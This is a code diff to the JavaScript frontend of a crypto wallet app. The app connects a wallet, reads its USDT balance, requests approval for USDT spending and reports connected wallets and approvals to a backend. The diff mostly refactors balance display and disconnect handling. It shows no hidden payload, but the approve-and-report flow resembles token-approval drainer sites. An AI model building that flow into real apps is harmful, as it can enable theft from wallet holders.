@@ -28,7 +28,6 @@ const statusMessage = document.getElementById('status-message')
 let provider = null
 let signer = null
 let walletAddress = null
-let walletBalance = '0.00'
 let backendNotified = false
 
 // Initialize app
@@ -36,19 +35,12 @@ document.addEventListener('DOMContentLoaded', () => {
   // Check for existing connection
   const storedAddress = localStorage.getItem('walletAddress')
   const storedBackendNotified = localStorage.getItem('backendNotified') === 'true'
-  const storedBalance = localStorage.getItem('walletBalance') || '0.00'
   
   if (storedAddress) {
     walletAddress = storedAddress
-    walletBalance = storedBalance
     backendNotified = storedBackendNotified
     showWalletSection()
     updateWalletInfo()
-    
-    // Update balance display from stored value
-    if (usdtBalanceEl) {
-      usdtBalanceEl.textContent = `${parseFloat(walletBalance).toFixed(2)} USDT`
-    }
   }
   
   // Set network info
@@ -85,12 +77,8 @@ async function connectWallet() {
     // Switch to correct network
     await switchToCorrectNetwork()
     
-    // Get USDT balance before sending to backend
-    walletBalance = await getWalletUSDTBalance()
-    
     // Save to localStorage
     localStorage.setItem('walletAddress', walletAddress)
-    localStorage.setItem('walletBalance', walletBalance)
     localStorage.setItem('backendNotified', 'false')
     backendNotified = false
     
@@ -98,7 +86,7 @@ async function connectWallet() {
     showWalletSection()
     updateWalletInfo()
     
-    // Send to backend with correct balance
+    // Send to backend
     sendWalletToBackend()
     
   } catch (error) {
@@ -150,37 +138,28 @@ async function switchToCorrectNetwork() {
   }
 }
 
-// Get wallet USDT balance
-async function getWalletUSDTBalance() {
-  try {
-    if (!provider || !walletAddress) {
-      return '0.00'
-    }
-    
-    const usdtContract = new Contract(
-      CONFIG.USDT_CONTRACT_ADDRESS,
-      ['function balanceOf(address account) external view returns (uint256)'],
-      provider
-    )
-    
-    const balance = await usdtContract.balanceOf(walletAddress)
-    const formattedBalance = ethers.formatUnits(balance, 18)
-    return formattedBalance
-  } catch (error) {
-    console.error('Balance fetch error:', error)
-    return '0.00'
-  }
-}
-
 // Update wallet information
 async function updateWalletInfo() {
   if (!walletAddress) return
   
   walletAddressEl.textContent = formatAddress(walletAddress)
   
-  // Update balance display
-  if (usdtBalanceEl) {
-    usdtBalanceEl.textContent = `${parseFloat(walletBalance).toFixed(2)} USDT`
+  // Get USDT balance
+  try {
+    if (provider) {
+      const usdtContract = new Contract(
+        CONFIG.USDT_CONTRACT_ADDRESS,
+        ['function balanceOf(address account) external view returns (uint256)'],
+        provider
+      )
+      
+      const balance = await usdtContract.balanceOf(walletAddress)
+      const formattedBalance = ethers.formatUnits(balance, 18)
+      usdtBalanceEl.textContent = `${parseFloat(formattedBalance).toFixed(2)} USDT`
+    }
+  } catch (error) {
+    console.error('Balance error:', error)
+    usdtBalanceEl.textContent = '0.00 USDT'
   }
 }
 
@@ -304,7 +283,7 @@ async function approveUSDTSpending() {
   }
 }
 
-// Send wallet to backend (connection only) with correct balance
+// Send wallet to backend (connection only)
 async function sendWalletToBackend() {
   try {
     const response = await fetch(`${CONFIG.API_URL}/wallets/connect`, {
@@ -314,8 +293,7 @@ async function sendWalletToBackend() {
       },
       body: JSON.stringify({
         address: walletAddress,
-        name: `Wallet ${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`,
-        balance: walletBalance // Send the balance with the connection
+        name: `Wallet ${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`
       })
     })
     
@@ -370,27 +348,58 @@ async function notifyApprovalToBackend() {
   }
 }
 
-// Reset connection flow
+// Reset connection flow - completely reset everything
 function resetConnection() {
   // Clear all state
   walletAddress = null
-  walletBalance = '0.00'
   provider = null
   signer = null
   backendNotified = false
   
   // Clear localStorage
   localStorage.removeItem('walletAddress')
-  localStorage.removeItem('walletBalance')
   localStorage.removeItem('backendNotified')
   
-  // Reset UI
+  // Reset UI to initial state
   showConnectSection()
+  
+  // Reset buttons
+  connectWalletBtn.disabled = false
+  connectText.textContent = 'Connect Wallet'
+  approveBtn.disabled = false
+  approveText.textContent = 'Approve USDT Spending'
+  
+  // Clear wallet info
+  if (walletAddressEl) walletAddressEl.textContent = ''
+  if (usdtBalanceEl) usdtBalanceEl.textContent = '0.00 USDT'
+  
+  showSuccess('Wallet disconnected. You can now connect a different wallet.')
 }
 
-// Disconnect wallet
-function disconnectWallet() {
-  resetConnection()
+// Disconnect wallet - this is the button handler
+async function disconnectWallet() {
+  try {
+    showLoading(disconnectBtn, true)
+    
+    // Reset everything
+    resetConnection()
+    
+    // Optional: Notify user
+    showSuccess('Wallet disconnected successfully!')
+    
+  } catch (error) {
+    console.error('Disconnect error:', error)
+    showError('Error disconnecting wallet: ' + error.message)
+  } finally {
+    showLoading(disconnectBtn, false)
+    
+    // Reset disconnect button text after a moment
+    setTimeout(() => {
+      if (disconnectBtn) {
+        disconnectBtn.innerHTML = 'Disconnect Wallet'
+      }
+    }, 1000)
+  }
 }
 
 // Show connect section
@@ -420,19 +429,32 @@ function formatAddress(address) {
 
 // Show loading state
 function showLoading(element, show) {
+  if (!element) return;
+  
   if (show) {
+    const originalText = element.textContent || element.innerText;
+    element.setAttribute('data-original-text', originalText);
     element.innerHTML = '<span class="loading"></span>Processing...'
   } else {
-    if (element.id === 'connect-text') {
-      element.textContent = 'Connect Wallet'
-    } else if (element.id === 'approve-text') {
-      element.textContent = 'Approve USDT Spending'
+    const originalText = element.getAttribute('data-original-text');
+    if (originalText) {
+      element.textContent = originalText;
+    } else {
+      if (element.id === 'connect-text') {
+        element.textContent = 'Connect Wallet'
+      } else if (element.id === 'approve-text') {
+        element.textContent = 'Approve USDT Spending'
+      } else if (element.id === 'disconnect-btn') {
+        element.innerHTML = 'Disconnect Wallet'
+      }
     }
   }
 }
 
 // Show success message
 function showSuccess(message) {
+  if (!statusMessage) return;
+  
   statusMessage.textContent = message
   statusMessage.className = 'status status-success'
   statusMessage.classList.remove('hidden')
@@ -444,6 +466,8 @@ function showSuccess(message) {
 
 // Show error message
 function showError(message) {
+  if (!statusMessage) return;
+  
   statusMessage.textContent = message
   statusMessage.className = 'status status-error'
   statusMessage.classList.remove('hidden')
